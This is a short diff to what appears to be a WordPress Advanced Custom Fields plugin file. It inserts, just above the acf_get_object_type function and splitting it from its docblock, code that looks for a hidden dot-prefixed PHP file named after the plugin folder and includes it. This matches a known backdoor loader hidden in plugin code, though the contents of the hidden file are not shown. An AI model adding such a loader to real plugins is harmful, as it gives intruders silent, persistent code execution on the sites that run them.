@@ -10,6 +10,10 @@
  * @param	string $object_subtype Optional object subtype (post type, taxonomy).
  * @return	object
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_get_object_type( $object_type, $object_subtype = '' ) {
 	$props = array(
 		'type'		=> $object_type,
